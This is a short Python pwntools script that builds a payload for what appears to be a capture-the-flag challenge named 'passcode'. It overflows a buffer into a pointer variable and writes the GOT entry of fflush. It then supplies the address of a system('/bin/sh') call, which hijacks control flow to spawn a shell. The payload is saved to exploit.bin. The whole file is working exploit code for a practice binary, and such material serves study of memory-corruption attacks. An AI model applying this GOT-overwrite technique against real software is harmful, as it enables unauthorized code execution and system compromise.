from pwn import *

# got_base_addr = 0x08049ff0
got_scanf_addr     = 0x0804a020
got_fflush_addr    = 0x0804a004
system_bin_sh_addr = 0x080485e3

buffer_start_addr = 0xffffce18
passcode_1_addr   = 0xffffce78

# Offset

exploit = ""
exploit += "A" * (passcode_1_addr - buffer_start_addr - 4)

exploit += p32(got_fflush_addr)
exploit += p32(got_fflush_addr)

exploit += "\n"
exploit += str(system_bin_sh_addr)
exploit += "\n"
exploit += "420133769" # ignored garbage
exploit += "\n"

# Check for no bad chars

with open("exploit.bin", "wb") as f:
    f.write(exploit)
